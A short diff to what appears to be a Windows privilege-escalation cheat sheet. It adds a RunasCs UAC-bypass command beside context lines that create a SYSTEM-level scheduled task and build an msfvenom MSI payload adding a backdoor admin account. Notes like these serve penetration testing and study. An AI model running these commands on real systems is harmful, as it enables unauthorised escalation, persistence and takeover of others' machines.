@@ -80,6 +80,12 @@ schtasks /create /tn "shell" /tr "task.exe" /sc MINUTE /mo 1 /ru "SYSTEM"
 ```bash
 msfvenom -p windows/adduser USER=admin2 PASS=P@ssword123! -f msi-nouac -o alwe.msi
 ```
+
+Using RunasCs.exe to bypass UAC:
+#uac #bypass-uac
+```powershell
+.\RunasCs.exe $USER $PASS $CMD --bypass-uac -l 5
+```
 Search for passwords inside the registry
 ---
 ```powershell
